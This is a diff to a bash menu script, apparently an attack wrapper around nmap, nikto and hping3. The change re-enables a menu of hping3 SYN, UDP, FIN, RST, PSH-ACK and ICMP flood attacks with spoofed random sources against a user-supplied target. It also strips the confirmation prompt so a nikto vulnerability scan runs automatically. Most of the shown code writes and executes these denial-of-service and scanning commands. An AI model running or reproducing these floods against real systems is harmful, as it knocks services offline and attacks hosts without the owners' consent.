@@ -43,18 +43,23 @@ nmap()
         if [[ $ch == "1" ]]; then
           cd scripts
           bash 1.sh
+          main
         elif [[ $ch == "2" ]]; then
           cd scripts
           bash 2.sh
+          main
         elif [[ $ch == "3" ]]; then
           cd scripts
           bash 3.sh
+          main
         else
           echo "We will not run any of scripts as you said"
+          main
         fi
 
     else
         echo "We will not run any of scripts as you said"
+        main
     fi
 }
 #nmap
@@ -62,17 +67,11 @@ nmap()
 #nikto - overall basic scan [vulnerability assessment]
 nikto()
 {
-    echo "Would you like to perform a vulnerability assessment?(y/n)?"
-    echo ""
-    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read nikto
-    if [[ $nikto == "Y" || $nikto == "y" ]]; then
-        touch attack_nikto.txt
-        echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
-        echo -n "$target" >> attack_nikto.txt
-        bash attack_nikto.txt
-    else
-        echo "We will not run any of scripts as you said"
-    fi
+    touch attack_nikto.txt
+    echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
+    echo -n "$target" >> attack_nikto.txt
+    bash attack_nikto.txt
+    main
 }
 #nikto
 
@@ -100,75 +99,57 @@ hping()
         echo "Which one would you like to do?"
         echo -n "${red}(づ｡◕‿‿◕｡)づ     ${end}" ; read choice
         if [[ $choice == "1" ]]; then
-          cd results/hping/
           touch host_alive.txt
           echo -n "hping3 -c 1 -V -p 80 -s 5050 -F " > host_alive.txt
-          cd ../..
-          echo -n "$target" >> results/hping/host_alive.txt
-          cd results/hping/
+          echo -n "$target" >> host_alive.txt
           bash host_alive.txt
-          cd ../..
           hping
         elif [[ $choice == "2" ]]; then
-          cd results/hping/
           touch hping_dos.txt
           echo -n "hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_dos.txt
-          cd results/hping/
-          bash hping_dos.txt
-          cd ../..
-          hping
 
+          echo -n "$target" >> hping_dos.txt
+          bash hping_dos.txt
+          hping
         elif [[ $choice == "3" ]]; then
-          cd results/hping/
           touch hping_udp.txt
           echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_udp.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_udp.txt
-          cd results/hping/
+          
+          echo -n "$target" >> hping_udp.txt
           bash hping_udp.txt
-          cd ../..
           hping
 
         elif [[ $choice == "4" ]]; then
-          cd results/hping/
           touch hping_tcp_fin.txt
           echo -n "hping3 --flood --rand-source -F -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_tcp_fin.txt
-          cd results/hping/
+          echo -n "$target" >> hping_tcp_fin.txt
           bash hping_tcp_fin.txt
-          cd ../..
           hping
 
         elif [[ $choice == "5" ]]; then
-          cd results/hping/
           touch hping_tcp_rst.txt
           echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_rst.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_tcp_rst.txt
-          cd results/hping/
+          
+          echo -n "$target" >> hping_tcp_rst.txt
           bash hping_tcp_rst.txt
-          cd ../..
+          hping
+
         elif [[ $choice == "6" ]]; then
-          cd results/hping/
           touch hping_puch_ack.txt
           echo -n "hping3 --flood --rand-source -PA -p 80 " > hping_puch_ack.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_puch_ack.txt
-          cd results/hping/
+          
+          echo -n "$target" >> hping_puch_ack.txt
           bash hping_puch_ack.txt
-          cd ../..
+          hping
+
         elif [[ $choice == "7" ]]; then
-          cd results/hping/
           touch hping_icmp_igmp.txt
           echo -n "hping3 --flood --rand-source -1 -p 80 " > hping_icmp_igmp.txt #we will do port 80, in specific cases you can manually change it to port 443
-          cd ../..
-          echo -n "$target" >> results/hping/hping_icmp_igmp.txt
-          cd results/hping/
+          
+          echo -n "$target" >> hping_icmp_igmp.txt
           bash hping_icmp_igmp.txt
-          cd ../..
+          hping
+          
         else
           echo "Would you like to do it over again? (y/n)"
           echo -n "${red}(ಠ_ಠ)    ${end}" ; read repeat
@@ -202,8 +183,8 @@ main()
   elif [[ $option == "2" ]]; then
     nmap
   elif [[ $option == "3" ]]; then
-    #hping
-    continue
+    hping
+    
   else
     echo "Bye"
 fi
